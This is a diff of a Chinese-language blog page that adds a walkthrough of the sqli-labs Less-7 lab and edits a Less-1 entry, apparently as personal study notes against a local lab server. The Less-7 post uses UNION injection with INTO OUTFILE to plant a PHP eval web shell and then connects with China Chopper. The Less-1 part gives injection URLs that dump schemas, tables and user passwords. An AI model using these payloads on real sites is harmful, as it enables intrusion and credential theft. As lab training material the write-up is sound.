@@ -64,6 +64,61 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-7" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/02/sql-labs-Less-7/" class="article-date">
+  <time datetime="2021-02-02T03:51:02.000Z" itemprop="datePublished">2021-02-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/02/sql-labs-Less-7/">sql-labs-Less-7</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-7</h1>
+进入http://127.0.0.1/sql/Less-7，输入/?id=1',显示下面的图：
+
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/02/sql-labs-Less-7/2.png" alt="2"></p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/02/sql-labs-Less-7/1.png" alt="1"><br>说明有sql注入漏洞，但是不知道要用什么注入，看源代码知道要用<code>&#39;))</code>(?)注入<br>“use outfile”表示要用out file函数。<br>用order by查出数据有三列，然后用union操作符和outfile注入一句话木马。<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-7/?id=-1&#39;">http://127.0.0.1/sql/Less-7/?id=-1&#39;</a>))  union select 1,2,”<?php @eval($_POST['pass']);?>“ into outfile ‘E:\PhpStudy2018\PHPTutorial\WWW\sql\Less-7\text.php’–+<br>在E:\PhpStudy2018\PHPTutorial\WWW\sql\Less-7目录下生成text.php</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/blob/master/2021/02/02/sql-labs-Less-7/3.png" alt="3"></p>
+<p>然后用中国菜刀打开<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-7/text.php">http://127.0.0.1/sql/Less-7/text.php</a><br><img src="https://github.com/yzhk/yzhk.github.io/blob/master/2021/02/02/sql-labs-Less-7/4.png" alt="4"></p>
+<p>这样就拿到了这个网站的webshell。</p>
+<h1>小结</h1>
+                1.一句话木马：<?php @eval($_POST['pass']);?>（‘pass’是可以任意设置的密码）<br>
+    2.load file() 读取本地文件 select load file('要读取的文件的路径');<br>
+        //select load file('E:\\PhpStudy2018\\PHPTutorial\\WWW\\sql\\Less-7\\text.txt');<br>
+    3.into outfile 写文件 select "要写的内容" into outfile 'text.txt';(这样默认在E:\\PhpStudy2018\\PHPTutorial\\Mysql\\date下生成text.txt)<br>
+        //select "pass" into outfile 'E:\\PhpStudy2018\\PHPTutorial\\WWW\\sql\\Less-7\\text.txt' ;(在E:\\PhpStudy2018\\PHPTutorial\\WWW\\sql\\Less-7下生成text.txt文件)<br>
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/02/sql-labs-Less-7/" data-id="ckknvuqmx00003ouxddf84k8l" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-5~6" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/01/27/sql-labs-Less-5~6/" class="article-date">
@@ -174,7 +229,7 @@
 <p>此时可以用union进行注入，union的作用是在当前一组数据后再加一组数据，且当id的数据在库中不存在时，会直接输出；<br>如果id在库中存在，则输出当前id在库中的数据（此时可以id=-1，使当前id的数据为空，输出我们加进去的数据）<br>注意：用union输入的数据的列数要与本来的数据的列数相同；<br>输入 <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-1/?id=1&#39;union">http://127.0.0.1/sql/Less-1/?id=1&#39;union</a> select 1,2,3–+<br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/8.png" alt="8"></p>
 <p>因为id=1时，库中有数据，所以输出当前id在库中的数据，我们把id=-1：<br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/9.png" alt="9"><br>这时就输出了我们加入的数据。</p>
 <p>这个时候就可以暴库了，这里是在Your Login name位置输出，也可以把<code>group_concat(schema_name)</code>放在3的位置，在Your Password位置输出：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-1/?id=-1&#39;union">http://127.0.0.1/sql/Less-1/?id=-1&#39;union</a> select 1,group_concat(schema_name),3 from information_schema.schemata–+<br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/10.png" alt="10"><br>爆出的数据库有：<br>    <code>information_schema,challenges,mysql,performance_schema,security,test</code></p>
-<p>然后选要爆的数据库的数据表，这里是选security数据库，<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-1/?id=-1&#39;union">http://127.0.0.1/sql/Less-1/?id=-1&#39;union</a> select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+<br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/11.png" alt="11"><br>爆出的表有：<br>    <code>emails,referers,uagents,users</code></p>
+<p>然后选要爆的数据库的数据表，这里是选security数据库，<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-1/?id=-1&#39;union">http://127.0.0.1/sql/Less-1/?id=-1&#39;union</a> select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+(<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-1/?id=-1&#39;union">http://127.0.0.1/sql/Less-1/?id=-1&#39;union</a> select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 –+)<br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/11.png" alt="11"><br>爆出的表有：<br>    <code>emails,referers,uagents,users</code></p>
 <p>再选要爆的数据表的数据列，这里选users数据表，<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-1/?id=-1&#39;union">http://127.0.0.1/sql/Less-1/?id=-1&#39;union</a> select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+<br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/12.png" alt="12"><br>爆出的列名：<br>    <code>id,username,password</code></p>
 <p>最后就可以爆数据了，这里我们只要username和password，<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-1/?id=-1&#39;union">http://127.0.0.1/sql/Less-1/?id=-1&#39;union</a> select 1,username,password from users where id=1–+<br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/13.png" alt="13"><br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-1/?id=-1&#39;union">http://127.0.0.1/sql/Less-1/?id=-1&#39;union</a> select 1,username,password from users where id=2–+<br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/14.png" alt="14"><br>……</p>
 <p>也可以用group_concat函数爆数据，<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-1/?id=-1&#39;union">http://127.0.0.1/sql/Less-1/?id=-1&#39;union</a> select 1,group_concat(username),group_concat(password) from users–+<br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/01/22/sql-labs-Less-1~4/15.png" alt="15"><br>    <code>username：Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</code><br>    <code>password：Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</code></p>
@@ -429,6 +484,10 @@
       <ul>
         
           <li>
+            <a href="/2021/02/13/sql-labs-Less-23/">sql-labs-Less-23</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/12/sql-labs-Less-21~22/">sql-labs-Less-21~22</a>
           </li>
         
@@ -442,10 +501,6 @@
         
           <li>
             <a href="/2021/02/10/sql-labs-Less-18/">sql-labs-Less-18</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/09/sql-labs-Less-17/">sql-labs-Less-17</a>
           </li>
         
       </ul>
